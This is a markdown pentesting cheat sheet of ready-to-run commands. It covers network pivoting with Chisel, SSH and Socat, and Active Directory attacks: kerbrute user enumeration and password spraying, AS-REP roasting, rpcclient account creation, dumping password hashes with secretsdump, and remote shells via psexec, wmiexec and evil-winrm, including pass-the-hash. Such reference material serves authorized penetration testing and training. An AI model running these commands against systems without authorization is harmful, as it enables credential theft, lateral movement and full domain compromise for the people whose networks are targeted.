# Network Pentesting Methodologies

## Summary
- [Pivoting within network](#pivoting-within-network)
  - [Remote port forwarding with Chisel](#remote-port-forwarding-with-chisel)
  - [Getting internet access on remote machine with Chisel](#getting-internet-access-on-remote-machine-with-chisel)
  - [Port forwarding with SSH](#port-forwarding-with-ssh)
  - [Port forwarding with Socat](#port-forwarding-with-socat)
- [Pentesting Active Directory](#pentesting-active-directory)
  - [Enumerate users](#enumerate-users)
  - [Enumerate using RPCClient](#enumerate-using-rpcclient)
  - [Dump password hashes](#dump-password-hashes)
  - [Windows remoting](#windows-remoting)
  - [Shell on remote machine](#shell-on-remote-machine)

## Pivoting within network
### Remote port forwarding with Chisel
*Run on local machine*

`chisel server -p 8000 --reverse`

*Run on remote machine*

`chisel client 10.0.0.1:8000 R:{remote-port}:{target-ip}:{target-port}`

### Getting internet access on remote machine with Chisel
*Run on local machine*

`chisel server -p 8000`

*Run on remote machine*

`chisel client 10.0.0.1:8000 {remote-port}:{target-address}:{target-port}`

### Port forwarding with SSH
`ssh -L {remote-port}:{target-ip}:{target-port} username@10.0.0.1 -p 22`

### Port forwarding with Socat
*Set up a listener on remote machine*

`socat tcp-listen:4444,reuseaddr,fork tcp:{ip2forward}:{port2forward}`

*Connect to listener from local machine*

`socat TCP:10.0.0.1:4444 -`


## Pentesting Active Directory
### Enumerate users
```
kerbrute userenum -d domain.com rockyou.txt
kerbrute passwordspray -d domain.com users.txt Password123
kerbrute bruteuser -d domain.com rockyou.txt user1
impacket-lookupsid domain.com/guest@10.0.0.1
impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.0.0.1 example.com/
```

### Enumerate using RPCClient
| Commands | Descriptions |
| -------- | ------------ |
| rpcclient -U "" 10.0.0.1 | Connect to AD |
| querydominfo | Domain information query |
| srvinfo | Server information |
| enumdomusers | Enumerate users |
| enumdomgroupd | Enumerate groups |
| querygroup 0x200 | Group queries |
| queryuser username | User queries |
| enumprivs | Enumerate privileges |
| getdompwinfo | Get domain password information |
| getusrdompwinfo 0x200 | Get user domain password |
| createdomuser username | Create domain user |
| setuserinfo2 username 24 password | Set a password for domain user |
| deletedomuser username | Delete domain user |
| enumalsgroups builtin | Enumerate alias groups |

### Dump password hashes
`impacket-secretsdump domain.com/username@10.0.0.1`

### Windows remoting
`crackmapexec winrm 10.0.0.1 -u username -p password`

### Shell on remote machine
```
impacket-psexec domain.com/username@10.0.0.1
impacket-wmiexec domain.com/username@10.0.0.1
evil-winrm -i 10.0.0.1 -u username -p password
evil-winrm -i 10.0.0.1 -u administrator -H "hash"                           1 ⨯
impacket-wmiexec domain.com/admin@10.0.0.1 -hashes [hash]
```
